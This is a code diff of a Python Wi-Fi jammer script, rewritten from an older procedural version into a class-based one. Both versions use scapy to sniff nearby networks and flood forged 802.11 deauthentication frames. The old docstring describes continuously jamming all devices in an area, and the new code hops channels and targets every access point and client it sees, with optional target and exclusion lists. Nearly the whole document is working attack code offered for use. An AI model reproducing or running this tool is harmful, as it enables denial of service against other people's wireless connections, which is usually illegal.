@@ -1,302 +1,383 @@
 #!/usr/bin/python
-# Author: Maximus
-# Description: Send Deauthentication packets to all nearby Devices that have the capabaility of transfering signals via Air. 
-
-__doc__ = '''
-Documentation:::
-Name: WiFiJammer.py
-Description: Continuously Jams all the Devices In the Area. Start The script and take Your Device anywhere you want
-
-Usage:
-python [scriptname] [argument...]
-python wifijammer.py --all
-
--a, --ap=	BSSID of Target AP
--c, --client=	BSSID of Client (Requires Access Point Mac Address)
--h, --help	This Help Manual
--o, --out=	comma-seperated BSSID's which you don't want to send Deauth Packets
--a, --all	Sent Deauth Packets to all nearby Devices.
-
-Examples:
-
-python wifijammer.py --all
-[!] This will send deauth packets to all nearby WiFi Networks. Even Hidden Networks
-
-python wifijammer.py -a FF:FF:FF:FF:FF:FF
-[!] This will send deauth packets to only a specific Target Acess Point
-
-python wifijammer.py -a FF:FF:FF:FF:FF:FF -c FF:FF:FF:FF:FF:FF
-[!] This will send deauth packets to a specific client of a specific Access Point
-
-python wifijammer.py --all --out=FF:FF:FF:FF:FF:FF,BB:BB:BB:BB:BB:BB:BB
-[!] This will send deauth packets to all nearby devices other than FF:FF:FF:FF:FF:FF and BB:BB:BB:BB:BB:BB
-'''
+#Author: @hash3liZer
 
 import sys
-import pkgutil as pkg
-pk = pkg.find_loader('scapy')
-if not pk:
-	sys.exit('Scapy Not Found. Try "python jammer.py install"')
-else:
-	from scapy.all import *
-from getopt import getopt, GetoptError
+import argparse
 import threading
 import os
 import time
 import signal
+import random
 import subprocess
 import re
+from pull import PULL
+from scapy.sendrecv import sniff
+from scapy.sendrecv import sendp
+from scapy.sendrecv import send
+from scapy.layers.dot11 import Dot11Beacon
+from scapy.layers.dot11 import Dot11
+from scapy.layers.dot11 import Dot11Elt
+from scapy.layers.dot11 import RadioTap
+from scapy.layers.dot11 import Dot11Deauth
+from scapy.layers.dot11 import Dot11FCS
+from scapy.layers.eap   import EAPOL
 
-interface = "" 
-list_ = []
-run_list = []
-out_ = []
-iwc = False
-arc = False
-sca = False
+class JAMMER:
 
+	__ACCESSPOINTS = []
+	__FORGERS      = []
+	__ONRUN        = []
 
-allc_ = 0
-ap_ = ""
-cl_ = ""
+	def __init__(self, prs):
+		self.interface = prs.interface
+		self.channel   = prs.channel
+		self.essids    = prs.essids
+		self.aps       = prs.aps
+		self.stations  = prs.stations
+		self.filters   = prs.filters
+		self.code      = prs.code
+		self.delay     = prs.delay
+		self.packets   = prs.packets
+		self.verbose   = prs.verbose
 
-W  = '\033[0m'
-R  = '\033[31m'
-G  = '\033[32m'
-O  = '\033[33m'
-B  = '\033[34m'
-P  = '\033[35m'
-C  = '\033[36m'
-GR = '\033[37m'
-T  = '\033[93m'
-
-def getNICnames():
-	ifaces = []
-	dev = open('/proc/net/dev', 'r')
-	data = dev.read()
-	for n in re.findall('[a-zA-Z0-9]+:', data):
-		ifaces.append(n.rstrip(":"))
-	return ifaces
-
-def ifaceCard():
-	global interface
-	cards = []
-	ifnames = getNICnames()
-	for n in ifnames:
-		if 'wlan' in n or 'mon' in n:
-			cards.append(n)
-	if len(cards) == 0:
-		print "["+R+"!"+W+"] No Wireless Card Detected\n[*]Exiting in 3 Seconds"
-		time.sleep(3)
-		sys.exit()
-	print "Write The Name of Desired Wireless Interface. Available are: "
-	for p in cards:
-		print p
-	while True:
-		ppt = raw_input("Enter The Name of Desired Wireless Interface: ")
-		if ppt in cards:
-			os.system('clear')
-			break
-	interface = ppt
-	return
-
-def monMode(iface):
-	out__ = open(os.devnull, 'wb')
-	if not confirmMon(iface):
-		try:
-			co = subprocess.call(['systemctl stop NetworkManager'], stdout=out__, stderr=out__)
-			if co == 0:
-				print "Killed"+" "+P+"Network Manager"					
-		except:
-			co = subprocess.call(['service', 'NetworkManager', 'stop'], stdout=out__, stderr=out__)
-			if co == 0:
-				print "Killed"+" "+P+"Network Manager"+W 
-		os.system('ifconfig %s down' % iface)
-		ab = os.system('iwconfig %s mode monitor' % iface)
-		if ab != 0:
-			os.system('ifconfig %s up' % iface)
-			sys.exit(R+"Failed to Put Card in Monitor Mode")
-		os.system('ifconfig %s up' % iface)
-		print T+iface+W+" in monitor mode"
-		out__.close()
-		return True
-
-def monModeOff(iface):
-	out__ = open(os.devnull, 'wb')
-	if confirmMon(iface):
-		try:
-			co = subprocess.call(['systemctl start NetworkManager'], stdout=out__, stderr=out__)					
-		except:
-			co = subprocess.call(['service', 'NetworkManager', 'start'], stdout=out__, stderr=out__)
-		os.system('ifconfig %s down' % iface)
-		if os.system('iwconfig %s mode managed' % iface) != 0 :
-			os.system('ifconfig %s up' % iface)
-			sys.exit(R+"Failed to Put Card in Managed Mode")
-		os.system('ifconfig %s up' % iface)
-		out__.close()
-		return True
-
-def confirmMon(iface):
-	co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
-	data = co.communicate()[0]
-	card = re.findall('Mode:[A-Za-z]+', data)[0]	
-	if "Monitor" in card:
-		return True
-	else:
-		return False	
-
-def aodStart(iface):
-	null = open(os.devnull, 'wb')
-	try:
-		subprocess.Popen(['airodump-ng', iface], stdout=null, stderr=null)
-	except KeyboardInterrupt:
-		pass
-	finally:
-		null.close()
-
-def collectDat(pkt):
-	global list_, out_
-	if pkt.haslayer(Dot11):
-		if pkt.haslayer(Dot11Beacon) and pkt.getlayer(Dot11).addr2 not in list_:
-			if pkt.getlayer(Dot11).addr2 in out_:
-				print R+"Removed"+W+", BSSID: %s ESSID: %S" % (pkt.getlayer(Dot11).addr2, pkt.getlayer(Dot11Elt).info)	
-			else: 
-				list_.append(str(pkt.getlayer(Dot11).addr2))
-				set(list_)
-				if pkt.haslayer(Dot11Elt):
-					ssid = pkt.getlayer(Dot11Elt).info
-				else:
-					ssid = "NO SSID"		
-				print G+"Added"+W+", BSSID: %s ESSID: %s" % (pkt.getlayer(Dot11).addr2, str(ssid))
-def sniffDat():
-	global interface
-	ch = 1
-	null_ = open(os.devnull, 'wb')
-	while True:
-		try:
-			subprocess.call(['iwconfig', interface, 'channel', str(ch)], stdout=null_, stderr=null_)
-			if ch < 11:
-				ch = ch+1
+	def extract_essid(self, layers):
+		essid = ''
+		counter = 1
+		layer = layers.getlayer(Dot11Elt, counter)
+		while layer:
+			if hasattr(layer, "ID") and layer.ID == 0:
+				essid = layer.info.decode('ascii')
+				break
 			else:
-				ch = 1
-			sniff(iface=interface, prn=collectDat, count=2)
-		except Exception:
-			pass
-	null_.close()
-	return
+				counter += 1
 
-def deauthDev(tgt):
-	global interface
-	pckt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=tgt, addr3=tgt) / Dot11Deauth()
-	while True:
-		try:
-			sendp(pckt, iface=interface, verbose=False)
-		except Exception:
-			break
-	return
+		return essid
+
+	def forge(self, sn, rc):
+		pkt = RadioTap() / Dot11(
+			type=0, 
+			subtype=12,
+			addr1=rc, 
+			addr2=sn, 
+			addr3=sn
+			) / Dot11Deauth(
+			reason=7
+			)
+
+		return pkt
+
+	def get_ess(self, sn, rc):
+		ess = ''
+		for key in self.__ACCESSPOINTS:
+			if key.get("bssid") == sn or key.get("bssid") == rc:
+				ess = key['essid']
+				break
+
+		return ess
+
+	def jammer(self, pkt, sn, rc):
+		send(
+			pkt,
+			inter=self.delay,
+			iface=self.interface,
+			count=self.packets,
+			loop=1,
+			verbose=False
+		)
+
+	def send(self, sender, receiver):
+		pkt = self.forge(sender, receiver)
+		essid = self.get_ess(sender, receiver)
 		
+		if pkt not in self.__ONRUN:
+			self.__ONRUN.append( pkt )	
+			pull.print("*",
+				"Sent Deauths Count [{count}] Code [{code}] {sender} -> {receiver} ({essid})".format(
+					count=pull.RED+str(self.packets)+pull.END,
+					code =pull.GREEN+str(self.code)+pull.END,
+					sender=pull.DARKCYAN+sender.upper().replace(":", "")+pull.END,
+					receiver=pull.DARKCYAN+receiver.upper().replace(":", "")+pull.END,
+					essid=essid
+				),
+				pull.YELLOW
+			)
 
-def deauthDev2(sc, dst):
-	global interface
-	norm = "FF:FF:FF:FF:FF:FF"
-	pckt = RadioTap() / Dot11(addr1=dst, addr2=sc, addr3=sc) / Dot11Deauth()
-	while True:
-		try:
-			sendp(pckt, iface=interface, verbose=False)
-			if dst == norm or dst == "":
-				print "Sent Deauth Packet to %s" % str(sc)
-				time.sleep(0.5)
-			else:
-				print "Send Deauth Packet From %s to %s" % (str(sc), str(dst))
-		except KeyboardInterrupt:
-			break
-		
+			sendp(
+				pkt,
+				inter=self.delay,
+				iface=self.interface,
+				count=self.packets,
+				loop=1,
+				verbose=False
+			)
 
-def collectDev():
-	global list_, run_list
-	for tgt in list_:
-		if tgt not in run_list:
-			thread = threading.Thread(target=deauthDev, args=(tgt,), name="deauth")
-			thread.daemon = True
-			thread.start()
-			run_list.append(tgt)
+	def deauthenticate(self, sender, receiver):
+		if self.aps and self.stations and self.filters:
+			if not sender in self.filters and not receiver in self.filters:
+				if sender in self.aps or receiver in self.aps or sender in self.stations or receiver in self.stations:
+					self.send(
+						sender,
+						receiver
+					)
+		elif self.aps and self.stations and not self.filters:
+			if sender in self.aps or receiver in self.aps or sender in self.stations or receiver in self.stations:
+				self.send(
+					sender,
+					receiver
+				)
+		elif self.aps and not self.stations and self.filters:
+			if not sender in self.filters and not receiver in self.filters:
+				if sender in self.aps or receiver in self.aps:
+					self.send(
+						sender,
+						receiver
+					)
+		elif not self.aps and self.stations and self.filters:
+			if not sender in self.filters and not receiver in self.filters:
+				if sender in self.stations or receiver in self.stations:
+					self.send(
+						sender,
+						receiver
+					)
+		elif self.aps and not self.stations and not self.filters:
+			if sender in self.aps or receiver in self.aps:
+				self.send(
+					sender,
+					receiver
+				)
+		elif not self.aps and not self.stations and self.filters:
+			if not sender in self.filters and not receiver in self.filters:
+				self.send(
+					sender,
+					receiver
+				)
+		elif not self.aps and self.stations and not self.filters:
+			if sender in self.stations or receiver in self.stations:
+				self.send(
+					sender,
+					receiver
+				)
 		else:
-			pass
+			self.send(sender, receiver)
 
-def apDeauth(sc,dst="FF:FF:FF:FF:FF:FF"):
-	deauthDev2(sc, dst)
-	
-def sig_handle(signal, frame):
-	os.system('clear')
-	print O+"Cleaning up Your Sexy Mess"
-	global interface
-	monModeOff(interface)
-	sys.exit()
+	def injector(self, pkt):
+		if pkt.haslayer(Dot11Beacon):
+			try:
+				macaddr = pkt.getlayer(Dot11FCS).addr2
+			except:
+				macaddr = pkt.getlayer(Dot11).addr2
+			essid   = self.extract_essid(pkt.getlayer(Dot11Elt))
+			toappend = {
+				'bssid': macaddr,
+				'essid': essid
+			}
+			if toappend not in self.__ACCESSPOINTS:
+				self.__ACCESSPOINTS.append(
+						toappend
+					)
+				self.deauthenticate( macaddr, "ff:ff:ff:ff:ff:ff" )
+		elif pkt.haslayer(Dot11FCS) and pkt.getlayer(Dot11FCS).type == 2 and not pkt.haslayer(EAPOL):
+			sender   = pkt.getlayer(Dot11FCS).addr2
+			receiver = pkt.getlayer(Dot11FCS).addr1
 
-def help():
-	sys.exit(__doc__)
+			self.deauthenticate(sender, receiver)
+
+		elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2 and not pkt.haslayer(EAPOL):
+			sender   = pkt.getlayer(Dot11).addr2
+			receiver = pkt.getlayer(Dot11).addr1
+
+			self.deauthenticate(sender, receiver)
+
+	def hopper(self, chs):
+		if type(chs) == tuple:
+			ch = random.choice(chs)
+			while True:
+				subprocess.call(['iwconfig', self.interface, 'channel', str(ch)])
+				time.sleep(1)
+
+				lc = ch
+				ch = random.choice(chs)
+				while ch == lc:
+					ch = random.choice(chs)
+		else:
+			subprocess.call(['iwconfig', self.interface, 'channel', str(chs)])
+
+	def engage(self):
+		t = threading.Thread(target=self.hopper, args=(self.channel,))
+		t.daemon = True
+		t.start()
+
+		sniff(iface=self.interface, prn=self.injector)
+
+class PARSER:
+
+	def __init__(self, opts):
+		self.help = self.help(opts.help)
+		self.interface = self.interface(opts.interface)
+		self.channel   = self.channel(opts.channel)
+		#self.essids    = self.essids(opts.essids)
+		self.aps       = self.aps(opts.aps)
+		self.stations  = self.stations(opts.stations)
+		self.filters   = self.filters(opts.filters)
+		self.code      = opts.code if (opts.code >= 1 and opts.code <= 66) else pull.halt("Invalid Reason Code", True, pull.RED)
+		self.delay     = opts.delay if opts.delay >= 0 else pull.halt("Invalid Delay Between Requests", True, pull.RED)
+		self.packets   = opts.packets if opts.packets > 0 else pull.halt("Packets Must Be greater than 0", True, pull.RED)
+		self.verbose   = opts.verbose
+		self.signal    = signal.signal(signal.SIGINT, self.handler)
+
+	def handler(self, sig, fr):
+		pull.halt(
+				"CTRL+C Received. Exiting", 
+				True,
+				"\r",
+				pull.RED
+			)
+
+	def help(self, hl):
+		if hl:
+			pull.help()
+
+	def channel(self, ch):
+		chs = tuple(range(1,15))
+		if ch:
+			if ch in chs:
+				return ch
+			else:
+				pull.halt("Not a Valid Channel. Choose in between 1-14.", True, pull.RED)
+		else:
+			return chs
+
+	def essids(self, essids):
+		retval = []
+		if essids:
+			essids = essids.split(",")
+			for essid in essids:
+				retval.append(essid)
+		else:
+			return []
+
+	def aps(self, aps):
+		retval = []
+		if aps:
+			aps = aps.split(",")
+			for ap in aps:
+				ap = ap.lower()
+				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", ap):
+					retval.append(ap)
+				else:
+					pull.halt("Not a Valid BSSID [%s]" % ap, True, pull.RED)
+		else:
+			return retval
+
+		return retval
+
+	def stations(self, sts):
+		retval = []
+		if sts:
+			sts = sts.split(",")
+			for st in sts:
+				st = st.lower()
+				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", st):
+					retval.append(st)
+				else:
+					pull.halt("Not a Valid MAC Address [%s]" % st, True, pull.RED)
+		else:
+			return retval
+
+		return retval
+
+	def filters(self, fts):
+		retval = []
+		if fts:
+			fts = fts.split(",")
+			for ft in fts:
+				ft = ft.lower()
+				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", ft):
+					retval.append(ft)
+				else:
+					pull.halt("Not a Valid MAC Address [%s]" % ft, True, pull.RED)
+		else:
+			return retval
+
+		return retval
+
+	def interface(self, iface):
+		def getNICnames():
+			ifaces = []
+			dev = open('/proc/net/dev', 'r')
+			data = dev.read()
+			for n in re.findall('[a-zA-Z0-9]+:', data):
+				ifaces.append(n.rstrip(":"))
+			return ifaces
+
+		def confirmMon(iface):
+			co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
+			data = co.communicate()[0].decode()
+			card = re.findall('Mode:[A-Za-z]+', data)[0]	
+			if "Monitor" in card:
+				return True
+			else:
+				return False
+
+		ifaces = getNICnames()
+		if iface in ifaces:
+			if confirmMon(iface):
+				return iface
+			else:
+				pull.halt("Interface Not in Monitor Mode [%s]" % iface, True, pull.RED) 
+		else:
+			pull.halt("No Such Interface [%s]" % iface, True, pull.RED)
+
 
 def main():
-	global allc_, ap_, cl_, out_
-	try:
-		opts, noopts = getopt(sys.argv[1:], "a:c:lho:", ['ap=', 'client=', 'all', 'help', 'out='])
-	except GetoptError:
-		help()
-	for o,v in opts:
-		if o == '-l' or o == '--all':
-			allc_ = 1
-		elif o == '-a' or o == '--ap':
-			ap_ = v
-		elif o == '-c' or o == '--client':
-			cl_ = v
-		elif o == '-h' or o == '--help':
-			help()
-		elif o == '-o' or o == '--out':
-			for n in v.split(','):
-				out_.append(n)
-		else:
-			sys.exit('No Such Options %s' % o)
+	parser = argparse.ArgumentParser( add_help=False )
 
-def macMass(bssid):
-	if len(bssid) == 17:
-		exp = re.match('^[a-fA-F0-9:]{17}|[a-fA-F0-9]{12}$', bssid, re.I)
-		if exp:
-			return True
-		else:
-			return False
-	else:
-		return False
+	parser.add_argument('-h', '--help', dest="help", default=False, action="store_true")
+	parser.add_argument('-i', '--interface', dest="interface", default="", type=str)
+	parser.add_argument('-c', '--channel'  , dest="channel"  , default=0 , type=int)
+	#parser.add_argument('-e', '-essids'    , dest="essids"   , default="", type=str)
+	parser.add_argument('-a', '--access-points', dest="aps"  , default="", type=str)
+	parser.add_argument('-s', '--stations' , dest="stations" , default="", type=str)
+	parser.add_argument('-f', '--filters'  , dest="filters"  , default="", type=str)
+	parser.add_argument('--code'           , dest="code"     , default=7 , type=int)
+	parser.add_argument('--delay'          , dest="delay"    , default=0.1 , type=int)
+	parser.add_argument('--packets'        , dest="packets"  , default=1, type=int)
+	parser.add_argument('--verbose'        , dest="verbose"  , default=False, action="store_true")
+
+	options = parser.parse_args()
+	parser  = PARSER(options)
+
+	pull.print(
+		"*",
+		"IFACE [{iface}] CH [{channel}]".format(
+			iface=parser.interface,
+			channel=("Hop" if type(parser.channel) == tuple else parser.channel)
+		),
+		pull.YELLOW
+	)
+	pull.print(
+		"*",
+		"APS [{bssids}] STS [{sts}] CODE [{code}]".format(
+			bssids=len(parser.aps),
+			sts   =len(parser.stations),
+			code  =parser.code,
+		),
+		pull.RED
+	)
+	pull.print(
+		"*",
+		"FILTERS [{filters}] STS [{delay}] PKTS [{packets}]".format(
+			filters=len(parser.filters),
+			delay  =parser.delay,
+			packets=parser.packets,
+		),
+		pull.GREEN
+	)
+
+	pull.print("^", "Engaging Now. Starting Jammer. ", pull.DARKCYAN)
+	jammer = JAMMER(parser)
+	jammer.engage()
 
 if __name__ == "__main__":
-	signal.signal(signal.SIGINT, sig_handle)
-	for n in range(5):
-		print("Starting" + "." * n)
-   		sys.stdout.write("\033[F")
-    		time.sleep(1)
+	pull = PULL()
 	main()
-	ifaceCard()
-	monMode(interface)
-	if allc_ is 1:	
-		accumu = threading.Thread(target=sniffDat)
-		accumu.daemon = True
-		accumu.start()
-		while True:
-			collectDev()
-	elif ap_ != '':
-		if cl_ != '':
-			if macMass(ap_) and macMass(cl_):
-				apDeauth(ap_, cl_)
-			else:
-				sys.exit('Make Sure of Your Arguments')
-		elif cl_ == '':
-			if macMass(ap_):
-				apDeauth(ap_)
-			else:
-				sys.exit('Make Sure of Your Arguments')
-		else:
-			sys.exit('Nothing Found Here')
-	else:
-		monModeOff(interface)
-		help()
-		
-	
